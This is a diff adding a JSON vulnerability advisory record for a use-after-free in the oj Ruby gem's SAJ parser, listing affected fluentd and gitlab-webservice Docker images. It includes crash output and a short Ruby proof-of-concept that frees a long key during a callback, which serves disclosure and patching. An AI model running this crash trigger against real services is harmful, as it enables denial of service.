@@ -1,0 +1,104 @@
+{
+  "schema_version": "1.8.0",
+  "id": "DHI-ixnf-flln-4dl6-rr2s",
+  "modified": "2026-09-21T15:11:14Z",
+  "published": "2026-09-21T15:11:14Z",
+  "upstream": [
+    "CVE-2026-54902"
+  ],
+  "summary": "### Summary",
+  "details": "### Summary\n\n`Oj::Parser` in SAJ mode does not protect cached object keys (≥ 35 bytes) from garbage collection. A Ruby callback that triggers GC inside `hash_end` can cause the key string to be reclaimed while the C parser still holds a pointer to it. The subsequent access to the freed string VALUE results in a segfault, confirmed by an RIP pointing to address `0x4242` (a canary-style pattern suggesting control over the freed memory's content).\n\n### Version\n\n- **Software**: oj gem\n- **Affected**: all versions with `ext/oj/saj2.c` / `ext/oj/parser.c`\n- **Latest tested**: 3.17.1 (confirmed present)\n\n### Details\n\nShort keys (≤ 34 bytes) are stored inline on the C stack and are safe. Long keys (≥ 35 bytes) are stored as heap-allocated Ruby String objects passed to `rb_funcall` as the `key` argument. Between the key being resolved and the callback completing, a GC triggered inside the callback (e.g. `GC.start`) can collect the key String, leaving a dangling VALUE.\n\nCrash output:\n```\nlong_key_trigger\n[BUG] Segmentation fault at 0x0000000000004242\n    close_object+0x260    /ext/oj/usual.c:405  (calls rb_funcall with freed key)\n    parse+0x11ff          /ext/oj/parser.c:693\n    parser_parse+0x145    /ext/oj/parser.c:1408\n\nRIP: 0x7fd1b46d68b7  RDI: 0x0000000000004242  (freed key VALUE)\nR12: 0x0000000000004242\n```\n\nThe freed VALUE `0x4242` shows the attacker-controlled content of the key string was loaded as a pointer — a classic use-after-free indicator.\n\n### Reproduce\n\n```ruby\nrequire 'oj'\n\nclass H < Oj::Saj\n  def add_value(value, key)\n    GC.start(full_mark: true, immediate_sweep: true) if key == 'x'\n  end\n  def hash_start(key); end\n  def hash_end(key); end\nend\n\np = Oj::Parser.new(:saj)\np.handler = H.new\np.parse('{\"' + 'A' * 35 + '\":{\"x\":1}}')  # long outer key, GC fires on inner key\n```",
+  "severity": [
+    {
+      "type": "CVSS_V4",
+      "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images",
+        "name": "fluentd",
+        "purl": "pkg:docker/dhi/fluentd?os_name=debian&os_version=12"
+      },
+      "versions": [
+        "1.18.0-debian12",
+        "1.18.0-dev-debian12-dev"
+      ],
+      "database_specific": {
+        "owner_kind": "IMAGE"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images",
+        "name": "fluentd",
+        "purl": "pkg:docker/dhi/fluentd?os_name=debian&os_version=13"
+      },
+      "versions": [
+        "1.18.0-debian13",
+        "1.18.0-dev-debian13-dev",
+        "1.19.0-debian13",
+        "1.19.0-debian13-dev",
+        "1.19.0-dev-debian13-dev",
+        "1.19.1-debian13",
+        "1.19.1-debian13-dev",
+        "1.19.2-debian13",
+        "1.19.2-debian13-dev"
+      ],
+      "database_specific": {
+        "owner_kind": "IMAGE"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images",
+        "name": "gitlab-webservice",
+        "purl": "pkg:docker/dhi/gitlab-webservice?os_name=debian&os_version=13"
+      },
+      "versions": [
+        "18.11.1-debian13",
+        "18.11.1-debian13-dev",
+        "18.11.1-debian13-fips",
+        "18.11.1-debian13-fips-dev",
+        "18.11.3-debian13",
+        "18.11.3-debian13-dev",
+        "18.11.3-debian13-fips",
+        "18.11.3-debian13-fips-dev",
+        "18.11.4-debian13",
+        "18.11.4-debian13-dev",
+        "18.11.4-debian13-fips",
+        "18.11.4-debian13-fips-dev"
+      ],
+      "database_specific": {
+        "owner_kind": "IMAGE"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "ADVISORY",
+      "url": "https://scout.docker.com/v/DHI-ixnf-flln-4dl6-rr2s"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://github.com/advisories/GHSA-m578-w5vf-rfcm"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://github.com/ohler55/oj/security/advisories/GHSA-m578-w5vf-rfcm"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://security-tracker.debian.org/tracker/CVE-2026-54902"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://ubuntu.com/security/CVE-2026-54902"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "http://people.ubuntu.com/~ubuntu-security/cve/CVE-2026-54902"
+    }
+  ]
+}
